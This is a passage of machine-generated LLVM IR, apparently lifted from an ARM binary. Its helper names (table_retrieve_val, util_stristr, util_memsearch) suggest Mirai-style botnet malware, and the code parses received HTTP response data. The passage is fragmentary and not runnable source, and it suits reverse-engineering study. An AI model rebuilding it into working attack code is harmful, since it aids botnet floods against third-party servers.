  %v3_9520 = mul i32 %v3_951c, 128
  %v1_9524 = add i32 %v3_9520, 1472
  %v0_9528 = load i32, i32* @r5, align 4
  store i32 %v0_9528, i32* %r1.global-to-local, align 4
  %v0_952c = load i32, i32* %sb.global-to-local, align 4
  %v2_952c = add i32 %v1_9524, %v0_952c
  store i32 %v2_952c, i32* @r0, align 4
  %v2_9530 = inttoptr i32 %v2_952c to i8*
  %v3_9530 = call i32 @util_strcpy(i8* %v2_9530, i32 %v0_9528)
  store i32 %v3_9530, i32* %r0.global-to-local, align 4
  %v0_9534 = load i32, i32* @sl, align 4
  %v1_9534 = add i32 %v0_9534, 16
  %v2_9534 = inttoptr i32 %v1_9534 to i32*
  %v3_9534 = load i32, i32* %v2_9534, align 4
  %v0_9538 = load i32, i32* @r8, align 4
  store i32 %v0_9538, i32* @r5, align 4
  %v1_953c = add i32 %v3_9534, 1
  store i32 %v1_953c, i32* %r3.global-to-local, align 4
  store i32 %v1_953c, i32* %v2_9534, align 4
  %v1_935c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_9548:                                ; preds = %dec_label_pc_9668
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_954c = load i32, i32* @r4, align 4
  %v2_954c = inttoptr i32 %v1_954c to i32*
  store i32 104, i32* %v2_954c, align 4
  br label %dec_label_pc_9550

dec_label_pc_9550:                                ; preds = %dec_label_pc_9694, %dec_label_pc_9028, %dec_label_pc_9548
  %v0_9550 = load i32, i32* @sl, align 4
  %v1_9550 = add i32 %v0_9550, -1452
  %v2_9550 = inttoptr i32 %v1_9550 to i32*
  %v3_9550 = load i32, i32* %v2_9550, align 4
  store i32 %v3_9550, i32* %r0.global-to-local, align 4
  %v1_9554 = call i32 @__GI___libc_close(i32 %v3_9550)
  store i32 %v1_9554, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9560 = load i32, i32* @sl, align 4
  %v2_9560 = add i32 %v1_9560, -1452
  %v3_9560 = inttoptr i32 %v2_9560 to i32*
  store i32 -1, i32* %v3_9560, align 4
  %v0_9564 = load i32, i32* %r2.global-to-local, align 4
  %v1_9564 = trunc i32 %v0_9564 to i8
  %v2_9564 = load i32, i32* @sl, align 4
  %v3_9564 = add i32 %v2_9564, -1448
  %v4_9564 = inttoptr i32 %v3_9564 to i8*
  store i8 %v1_9564, i8* %v4_9564, align 1
  br label %dec_label_pc_87ec

dec_label_pc_956c:                                ; preds = %dec_label_pc_85d4
  store i32 %v1_85d4, i32* %r3.global-to-local, align 4
  %v1_9570 = trunc i32 %v1_85d4 to i8
  store i8 %v1_9570, i8* %v2_860c, align 1
  %v0_9574 = load i32, i32* @r6, align 4
  %v1_9574 = add i32 %v0_9574, -1452
  %v2_9574 = inttoptr i32 %v1_9574 to i32*
  %v3_9574 = load i32, i32* %v2_9574, align 4
  store i32 %v3_9574, i32* %r0.global-to-local, align 4
  %v1_9578 = call i32 @__GI___libc_close(i32 %v3_9574)
  store i32 %v1_9578, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9580 = load i32, i32* @r6, align 4
  %v2_9580 = add i32 %v1_9580, -1452
  %v3_9580 = inttoptr i32 %v2_9580 to i32*
  store i32 -1, i32* %v3_9580, align 4
  br label %dec_label_pc_85f4

dec_label_pc_9588:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9350
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_9590 = call i32 @table_retrieve_val(i32 45, i32* null)
  %v0_9594 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9594, i32* @r1, align 4
  store i32 %v3_9590, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_95a0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9594, i32 %v3_9590)
  store i32 %v4_95a0, i32* %r0.global-to-local, align 4
  %v2_95a4 = icmp eq i32 %v4_95a0, -1
  store i1 %v2_95a4, i1* %cpsr_c.global-to-local, align 1
  %v7_95a4 = icmp eq i32 %v4_95a0, -1
  store i1 %v7_95a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95a4, label %dec_label_pc_9718, label %dec_label_pc_95ac

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9588
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_95b4 = call i32 @table_retrieve_val(i32 45, i32* null)
  %v0_95b8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_95b8, i32* @r1, align 4
  store i32 %v3_95b4, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_95c4 = call i32 @util_stristr(i8* %tmp168, i32 %v0_95b8, i32 %v3_95b4)
  store i32 %v4_95c4, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_95cc = add i32 %v4_95c4, %v2_827c
  %v3_95cc = inttoptr i32 %v2_95cc to i8*
  %v4_95cc = load i8, i8* %v3_95cc, align 1
  %v2_95d4 = icmp ugt i8 %v4_95cc, 31
  store i1 %v2_95d4, i1* %cpsr_c.global-to-local, align 1
  %v7_95d4 = icmp eq i8 %v4_95cc, 32
  store i1 %v7_95d4, i1* %cpsr_z.global-to-local, align 1
  %v2_95dc = zext i1 %v7_95d4 to i32
  %v2_95dc.v4_95c4 = add i32 %v2_95dc, %v4_95c4
  store i32 %v2_95dc.v4_95c4, i32* @r4, align 4
  %v2_95e0 = add i32 %v2_95dc.v4_95c4, %v2_827c
  store i32 %v2_95e0, i32* @r6, align 4
  store i32 %v2_95e0, i32* %r0.global-to-local, align 4
  %v1_95e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_95e8 = sub i32 %v1_95e8, %v2_95dc.v4_95c4
  store i32 %v2_95e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_95f4 = call i32 @util_memsearch(i32 %v2_95e0, i32 %v2_95e8, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2)
  store i32 %v5_95f4, i32* %r0.global-to-local, align 4
  %v2_95f8 = icmp eq i32 %v5_95f4, -1
  store i1 %v2_95f8, i1* %cpsr_c.global-to-local, align 1
  %v7_95f8 = icmp eq i32 %v5_95f4, -1
  store i1 %v7_95f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95f8, label %dec_label_pc_9718, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %dec_label_pc_95ac
  %v2_9600 = icmp ne i32 %v5_95f4, 0
  store i1 %v2_9600, i1* %cpsr_c.global-to-local, align 1
  %v7_9600 = icmp eq i32 %v5_95f4, 1
  store i1 %v7_9600, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r2.global-to-local, align 4
  %v7_9608 = icmp slt i32 %v5_95f4, 2
  br i1 %v7_9608, label %bb201, label %bb200

bb200:                                            ; preds = %dec_label_pc_9600
  %v9_9608 = add i32 %v5_95f4, -2
  store i32 %v9_9608, i32* %r0.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %dec_label_pc_9600, %bb200
  %v1_9610 = phi i32 [ %v5_95f4, %dec_label_pc_9600 ], [ %v9_9608, %bb200 ]
  %v2_9610 = add i32 %v1_9610, %v2_8710
  store i32 -20773, i32* @lr, align 4
  %v1_9618 = add i32 %v1_9610, 1
  store i32 %v1_9618, i32* @r5, align 4
  %v1_961c = load i32, i32* @r4, align 4
  %v2_961c = add i32 %v2_9610, %v1_961c
  store i32 %v2_961c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_9624 = load i32, i32* @r6, align 4
  store i32 %v0_9624, i32* %r0.global-to-local, align 4
  store i32 %v1_9618, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7ac.53 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_9634 = add i32 %v2_961c, -20773
  %v5_9634 = inttoptr i32 %v4_9634 to i8*
  store i8 0, i8* %v5_9634, align 1
  %v5_9638 = call i32 @util_memsearch(i32 %v0_9624, i32 %v1_9618, i32 ptrtoint ([5 x i8]* @global_var_1a7ac.53 to i32), i32 4)
  store i32 %v5_9638, i32* %r0.global-to-local, align 4
  %v2_963c = icmp ugt i32 %v5_9638, 3
  store i1 %v2_963c, i1* %cpsr_c.global-to-local, align 1
  %v7_963c = icmp eq i32 %v5_9638, 4
  store i1 %v7_963c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_963c, label %dec_label_pc_9a00, label %dec_label_pc_9644

dec_label_pc_9644:                                ; preds = %bb201
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v1_9648 = load i32, i32* @r4, align 4
  %v2_9648 = add i32 %v1_9648, %v2_827c
  %v3_9648 = inttoptr i32 %v2_9648 to i8*
  %v4_9648 = load i8, i8* %v3_9648, align 1
  %v6_9648 = zext i8 %v4_9648 to i32
  store i32 %v6_9648, i32* %r3.global-to-local, align 4
  %v2_964c = icmp ugt i8 %v4_9648, 46
  store i1 %v2_964c, i1* %cpsr_c.global-to-local, align 1
  %v7_964c = icmp eq i8 %v4_9648, 47
  store i1 %v7_964c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_964c, label %dec_label_pc_9c00, label %dec_label_pc_9654

dec_label_pc_9654:                                ; preds = %dec_label_pc_96a0, %dec_label_pc_9c30, %dec_label_pc_9c00, %dec_label_pc_9ad0, %dec_label_pc_9ab4, %dec_label_pc_9644, %dec_label_pc_9c48, %dec_label_pc_9afc
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9658 = load i32, i32* @sl, align 4
  %v3_9658 = add i32 %v2_9658, -1448
  %v4_9658 = inttoptr i32 %v3_9658 to i8*
  store i8 1, i8* %v4_9658, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9660:                                ; preds = %dec_label_pc_87e4
  %v0_9660 = call i32 @__GI___errno_location()
  store i32 %v0_9660, i32* %r0.global-to-local, align 4
  store i32 %v0_9660, i32* @r4, align 4
  br label %dec_label_pc_9668

dec_label_pc_9668:                                ; preds = %dec_label_pc_968c, %dec_label_pc_9660
  %v1_966c = phi i32 [ %v0_9660, %dec_label_pc_9660 ], [ %v0_9694, %dec_label_pc_968c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_966c = inttoptr i32 %v1_966c to i32*
  store i32 0, i32* %v2_966c, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v0_9674 = load i32, i32* @sl, align 4
  %v1_9674 = add i32 %v0_9674, -1452
  %v2_9674 = inttoptr i32 %v1_9674 to i32*
  %v3_9674 = load i32, i32* %v2_9674, align 4
  store i32 %v3_9674, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_967c = load i32, i32* %r3.global-to-local, align 4
  %v1_967c = add i32 %v0_967c, 16384
  store i32 %v1_967c, i32* %r3.global-to-local, align 4
  %v4_9680 = call i32 @__libc_recv(i32 %v3_9674, i32 %v2_827c, i32 10240, i32 %v1_967c)
  store i32 %v4_9680, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9684 = icmp eq i32 %v4_9680, 0
  store i1 %v2_9684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9684, label %dec_label_pc_9548, label %dec_label_pc_968c

dec_label_pc_968c:                                ; preds = %dec_label_pc_9668
  %v3_968c = icmp eq i32 %v4_9680, -1
  store i1 %v3_968c, i1* %cpsr_c.global-to-local, align 1
  %v8_968c = icmp eq i32 %v4_9680, -1
  store i1 %v8_968c, i1* %cpsr_z.global-to-local, align 1
  %v0_9694 = load i32, i32* @r4, align 4
  br i1 %v3_968c, label %dec_label_pc_9694, label %dec_label_pc_9668

dec_label_pc_9694:                                ; preds = %dec_label_pc_968c
  %v1_9694 = inttoptr i32 %v0_9694 to i32*
  %v2_9694 = load i32, i32* %v1_9694, align 4
  store i32 %v2_9694, i32* %r3.global-to-local, align 4
  %v2_9698 = icmp ugt i32 %v2_9694, 10
  store i1 %v2_9698, i1* %cpsr_c.global-to-local, align 1
  %v7_9698 = icmp eq i32 %v2_9694, 11
  store i1 %v7_9698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9698, label %dec_label_pc_96a0, label %dec_label_pc_9550

dec_label_pc_96a0:                                ; preds = %dec_label_pc_9694
  %v0_96a0 = load i32, i32* @sl, align 4
  %v1_96a0 = add i32 %v0_96a0, -1448
  %v2_96a0 = inttoptr i32 %v1_96a0 to i8*
  %v3_96a0 = load i8, i8* %v2_96a0, align 1
  %v4_96a0 = zext i8 %v3_96a0 to i32
  store i32 %v4_96a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_96a4 = icmp eq i8 %v3_96a0, 0
  store i1 %v2_96a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_96a4, label %dec_label_pc_87ec, label %dec_label_pc_9654

dec_label_pc_96b0:                                ; preds = %dec_label_pc_8df4
  %v0_96b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96b0 = add i32 %v0_96b0, 1
  store i32 %v1_96b0, i32* %r3.global-to-local, align 4
  %v1_96b4 = trunc i32 %v1_96b0 to i8
  %v2_96b4 = load i32, i32* @sl, align 4
  %v3_96b4 = add i32 %v2_96b4, -1448
  %v4_96b4 = inttoptr i32 %v3_96b4 to i8*
  store i8 %v1_96b4, i8* %v4_96b4, align 1
  br label %dec_label_pc_87ec

dec_label_pc_96bc:                                ; preds = %dec_label_pc_8c6c
  %v0_96bc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_96bc, i32* @r0, align 4
  %v0_96c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_96c0, i32* %r1.global-to-local, align 4
  %v2_96c4 = inttoptr i32 %v0_96bc to i8*
  %v3_96c4 = call i32 @util_strcpy(i8* %v2_96c4, i32 %v0_96c0)
  store i32 %v3_96c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c84

dec_label_pc_96cc:                                ; preds = %dec_label_pc_8d74
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_96d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_96d0 = inttoptr i32 %v1_96d0 to i32*
  store i32 104, i32* %v2_96d0, align 4
  %v0_96d4 = load i32, i32* @sl, align 4
  %v1_96d4 = add i32 %v0_96d4, -1452
  %v2_96d4 = inttoptr i32 %v1_96d4 to i32*
  %v3_96d4 = load i32, i32* %v2_96d4, align 4
  store i32 %v3_96d4, i32* %r0.global-to-local, align 4
  %v1_96d8 = call i32 @__GI___libc_close(i32 %v3_96d4)
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_96e4 = load i32, i32* @sl, align 4
  %v2_96e4 = add i32 %v1_96e4, -1452
  %v3_96e4 = inttoptr i32 %v2_96e4 to i32*
  store i32 -1, i32* %v3_96e4, align 4
  %v0_96e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i8
  %v2_96e8 = load i32, i32* @sl, align 4
  %v3_96e8 = add i32 %v2_96e8, -1448
  %v4_96e8 = inttoptr i32 %v3_96e8 to i8*
  store i8 %v1_96e8, i8* %v4_96e8, align 1
  br label %dec_label_pc_87ec

dec_label_pc_96f0:                                ; preds = %dec_label_pc_8d9c
  %v0_96f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_96f0 = inttoptr i32 %v0_96f0 to i32*
  %v2_96f0 = load i32, i32* %v1_96f0, align 4
  store i32 %v2_96f0, i32* %r3.global-to-local, align 4
  %v2_96f4 = icmp ugt i32 %v2_96f0, 10
  store i1 %v2_96f4, i1* %cpsr_c.global-to-local, align 1
  %v7_96f4 = icmp eq i32 %v2_96f0, 11
  store i1 %v7_96f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_96f4, label %dec_label_pc_87ec, label %dec_label_pc_96fc

dec_label_pc_96fc:                                ; preds = %dec_label_pc_96f0
  %v0_96fc = load i32, i32* @sl, align 4
  %v1_96fc = add i32 %v0_96fc, -1452
  %v2_96fc = inttoptr i32 %v1_96fc to i32*
  %v3_96fc = load i32, i32* %v2_96fc, align 4
  store i32 %v3_96fc, i32* %r0.global-to-local, align 4
  %v1_9700 = call i32 @__GI___libc_close(i32 %v3_96fc)
  store i32 %v1_9700, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_970c = load i32, i32* @sl, align 4
  %v2_970c = add i32 %v1_970c, -1452
  %v3_970c = inttoptr i32 %v2_970c to i32*
  store i32 -1, i32* %v3_970c, align 4
  %v0_9710 = load i32, i32* %r2.global-to-local, align 4
  %v1_9710 = trunc i32 %v0_9710 to i8
  %v2_9710 = load i32, i32* @sl, align 4
  %v3_9710 = add i32 %v2_9710, -1448
  %v4_9710 = inttoptr i32 %v3_9710 to i8*
  store i8 %v1_9710, i8* %v4_9710, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9718:                                ; preds = %dec_label_pc_95ac, %dec_label_pc_9588
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v3_9720 = call i32 @table_retrieve_val(i32 44, i32* null)
  %v0_9724 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9724, i32* @r1, align 4
  store i32 %v3_9720, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9730 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9724, i32 %v3_9720)
  store i32 %v4_9730, i32* %r0.global-to-local, align 4
  %v2_9738 = icmp eq i32 %v4_9730, -1
  store i1 %v2_9738, i1* %cpsr_c.global-to-local, align 1
  %v7_9738 = icmp eq i32 %v4_9730, -1
  store i1 %v7_9738, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9738, label %dec_label_pc_9938, label %dec_label_pc_9744

dec_label_pc_9744:                                ; preds = %dec_label_pc_9718
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v3_974c = call i32 @table_retrieve_val(i32 44, i32* null)
  %v0_9750 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9750, i32* @r1, align 4
  store i32 %v3_974c, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_975c = call i32 @util_stristr(i8* %tmp168, i32 %v0_9750, i32 %v3_974c)
  store i32 %v4_975c, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9764 = add i32 %v4_975c, %v2_827c
  %v3_9764 = inttoptr i32 %v2_9764 to i8*
  %v4_9764 = load i8, i8* %v3_9764, align 1
  %v2_976c = icmp ugt i8 %v4_9764, 31
  store i1 %v2_976c, i1* %cpsr_c.global-to-local, align 1
  %v7_976c = icmp eq i8 %v4_9764, 32
  store i1 %v7_976c, i1* %cpsr_z.global-to-local, align 1
  %v2_9774 = zext i1 %v7_976c to i32
  %v2_9774.v4_975c = add i32 %v2_9774, %v4_975c
  store i32 %v2_9774.v4_975c, i32* @r4, align 4
  %v2_9778 = add i32 %v2_9774.v4_975c, %v2_827c
  store i32 %v2_9778, i32* @r5, align 4
  store i32 %v2_9778, i32* %r0.global-to-local, align 4
  %v1_9780 = load i32, i32* %fp.global-to-local, align 4
  %v2_9780 = sub i32 %v1_9780, %v2_9774.v4_975c
  store i32 %v2_9780, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_978c = call i32 @util_memsearch(i32 %v2_9778, i32 %v2_9780, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2)
  store i32 %v5_978c, i32* %r0.global-to-local, align 4
  %v2_9790 = icmp eq i32 %v5_978c, -1
  store i1 %v2_9790, i1* %cpsr_c.global-to-local, align 1
  %v7_9790 = icmp eq i32 %v5_978c, -1
  store i1 %v7_9790, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_978c, i32* @r7, align 4
  br i1 %v7_9790, label %dec_label_pc_9938, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %dec_label_pc_9744
  %v2_979c = icmp ne i32 %v5_978c, 0
  store i1 %v2_979c, i1* %cpsr_c.global-to-local, align 1
  %v7_979c = icmp eq i32 %v5_978c, 1
  store i1 %v7_979c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %ip.global-to-local, align 4
  %v7_97a4 = icmp slt i32 %v5_978c, 2
  br i1 %v7_97a4, label %bb203, label %bb202

bb202:                                            ; preds = %dec_label_pc_979c
  %v9_97a4 = add i32 %v5_978c, -2
  store i32 %v9_97a4, i32* @r7, align 4
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_979c, %bb202
  %v1_97ac = phi i32 [ %v5_978c, %dec_label_pc_979c ], [ %v9_97a4, %bb202 ]
  store i32 %v2_8710, i32* %ip.global-to-local, align 4
  %v2_97ac = add i32 %v1_97ac, %v2_8710
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_97b4 = load i32, i32* @r4, align 4
  %v2_97b4 = add i32 %v2_97ac, %v1_97b4
  store i32 %v2_97b4, i32* %r2.global-to-local, align 4
  %v3_97b8 = load i32, i32* @r6, align 4
  %v4_97b8 = add i32 %v3_97b8, %v2_97b4
  %v5_97b8 = inttoptr i32 %v4_97b8 to i8*
  store i8 0, i8* %v5_97b8, align 1
  store i32 %v10_82f0, i32* @lr, align 4
  %v0_97c0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_97c0, i32* %stack_var_-44, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v1_97c8 = load i32, i32* @r4, align 4
  %v2_97c8 = add i32 %v1_97c8, %v2_827c
  %v3_97c8 = inttoptr i32 %v2_97c8 to i8*
  %v4_97c8 = load i8, i8* %v3_97c8, align 1
  %v6_97c8 = zext i8 %v4_97c8 to i32
  store i32 %v6_97c8, i32* %r0.global-to-local, align 4
  %v1_97cc = add nsw i32 %v6_97c8, -48
  store i32 %v1_97cc, i32* %r3.global-to-local, align 4
  %v2_97d0 = icmp ugt i32 %v1_97cc, 8
  store i1 %v2_97d0, i1* %cpsr_c.global-to-local, align 1
  %v7_97d0 = icmp eq i32 %v1_97cc, 9
  store i1 %v7_97d0, i1* %cpsr_z.global-to-local, align 1
  %v2_97d4 = xor i1 %v7_97d0, true
  %v3_97d4 = and i1 %v2_97d0, %v2_97d4
  br i1 %v3_97d4, label %.thread113, label %dec_label_pc_97dc

.thread113:                                       ; preds = %bb203
  %v4_97d4 = load i32, i32* @r5, align 4
  store i32 %v4_97d4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9804

dec_label_pc_97dc:                                ; preds = %bb203
  %v1_97e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97e0, %dec_label_pc_97dc
  %v0_97f8 = phi i32 [ %v1_97f8, %dec_label_pc_97e0 ], [ 1, %dec_label_pc_97dc ]
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v0_97f8, i32* %stack_var_-44, align 4
  %v2_97e8 = add i32 %v0_97f8, %v1_97e8.pre
  %v3_97e8 = inttoptr i32 %v2_97e8 to i8*
  %v4_97e8 = load i8, i8* %v3_97e8, align 1
  %v6_97e8 = zext i8 %v4_97e8 to i32
  store i32 %v6_97e8, i32* %r0.global-to-local, align 4
  %v1_97ec = add nsw i32 %v6_97e8, -48
  store i32 %v1_97ec, i32* %r3.global-to-local, align 4
  store i32 %v0_97f8, i32* %ip.global-to-local, align 4
  %v2_97f4 = icmp ugt i32 %v1_97ec, 8
  store i1 %v2_97f4, i1* %cpsr_c.global-to-local, align 1
  %v7_97f4 = icmp eq i32 %v1_97ec, 9
  store i1 %v7_97f4, i1* %cpsr_z.global-to-local, align 1
  %v1_97f8 = add i32 %v0_97f8, 1
  store i32 %v1_97f8, i32* @lr, align 4
  store i32 %v2_97e8, i32* %r1.global-to-local, align 4
  %v2_9800 = xor i1 %v2_97f4, true
  %v3_9800 = or i1 %v7_97f4, %v2_9800
  br i1 %v3_9800, label %dec_label_pc_97e0, label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %dec_label_pc_97e0, %.thread113
  %v2_9810 = phi i32 [ %v4_97d4, %.thread113 ], [ %v2_97e8, %dec_label_pc_97e0 ]
  %v0_9804 = phi i32 [ %v6_97c8, %.thread113 ], [ %v6_97e8, %dec_label_pc_97e0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9804 = icmp eq i32 %v0_9804, 0
  store i1 %v2_9804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9804, label %dec_label_pc_9938, label %dec_label_pc_980c

dec_label_pc_980c:                                ; preds = %dec_label_pc_9804
  store i32 0, i32* @r6, align 4
  %v3_9810 = inttoptr i32 %v2_9810 to i8*
  store i8 0, i8* %v3_9810, align 1
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9818 = load i32, i32* %stack_var_-44, align 4
  %v1_981c = add i32 %v3_9818, 1
  store i32 %v1_981c, i32* %ip.global-to-local, align 4
  store i32 %v1_981c, i32* %stack_var_-44, align 4
  %v0_9824 = load i32, i32* @r5, align 4
  %v2_9824 = add i32 %v0_9824, %v1_981c
  %v3_9824 = inttoptr i32 %v2_9824 to i8*
  %v4_9824 = load i8, i8* %v3_9824, align 1
  %v6_9824 = zext i8 %v4_9824 to i32
  store i32 %v6_9824, i32* %r3.global-to-local, align 4
  %v2_9828 = icmp ugt i8 %v4_9824, 31
  store i1 %v2_9828, i1* %cpsr_c.global-to-local, align 1
  %v7_9828 = icmp eq i8 %v4_9824, 32
  store i1 %v7_9828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9828, label %bb205, label %bb204

bb204:                                            ; preds = %dec_label_pc_980c
  store i32 %v2_9824, i32* @r4, align 4
  br label %.thread37

bb205:                                            ; preds = %dec_label_pc_980c
  %v2_982c = add i32 %v3_9818, 2
  store i32 %v2_982c, i32* %ip.global-to-local, align 4
  %v2_9830 = add i32 %v0_9824, %v2_982c
  store i32 %v2_9830, i32* @r4, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v2_982c, i32* %v11_82f4, align 4
  %v0_983c.pre = load i32, i32* @r4, align 4
  br label %.thread37

.thread37:                                        ; preds = %bb204, %bb205
  %v0_983c = phi i32 [ %v2_9824, %bb204 ], [ %v0_983c.pre, %bb205 ]
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  %v1_9840 = inttoptr i32 %v0_983c to i8*
  %v2_9840 = call i32 @util_strlen(i8* %v1_9840)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7b4.55 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9840, i32* @r1, align 4
  %v0_984c = load i32, i32* @r4, align 4
  store i32 %v0_984c, i32* %r0.global-to-local, align 4
  %v3_9850 = inttoptr i32 %v0_984c to i8*
  %v4_9850 = call i32 @util_stristr(i8* %v3_9850, i32 %v2_9840, i32 ptrtoint ([5 x i8]* @global_var_1a7b4.55 to i32))
  store i32 %v4_9850, i32* %r0.global-to-local, align 4
  %v2_9854 = icmp eq i32 %v4_9850, -1
  store i1 %v2_9854, i1* %cpsr_c.global-to-local, align 1
  %v7_9854 = icmp eq i32 %v4_9850, -1
  store i1 %v7_9854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9854, label %.thread38, label %dec_label_pc_9864

.thread38:                                        ; preds = %.thread37
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v4_985c = load i32, i32* %v11_82f4, align 4
  store i32 %v4_985c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9898

dec_label_pc_9864:                                ; preds = %.thread37
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9868 = load i32, i32* %stack_var_-44, align 4
  %v0_986c = load i32, i32* @r5, align 4
  %v2_986c = add i32 %v0_986c, %v3_9868
  store i32 %v2_986c, i32* @r4, align 4
  store i32 %v2_986c, i32* %r0.global-to-local, align 4
  %v1_9874 = inttoptr i32 %v2_986c to i8*
  %v2_9874 = call i32 @util_strlen(i8* %v1_9874)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7b4.55 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9874, i32* @r1, align 4
  %v0_9880 = load i32, i32* @r4, align 4
  store i32 %v0_9880, i32* %r0.global-to-local, align 4
  %v4_9884 = inttoptr i32 %v0_9880 to i8*
  %v5_9884 = call i32 @util_stristr(i8* %v4_9884, i32 %v2_9874, i32 ptrtoint ([5 x i8]* @global_var_1a7b4.55 to i32))
  store i32 %v5_9884, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_988c = load i32, i32* %stack_var_-44, align 4
  %v2_9890 = add i32 %v3_988c, %v5_9884
  store i32 %v2_9890, i32* %ip.global-to-local, align 4
  store i32 %v2_9890, i32* %stack_var_-44, align 4
  br label %dec_label_pc_9898

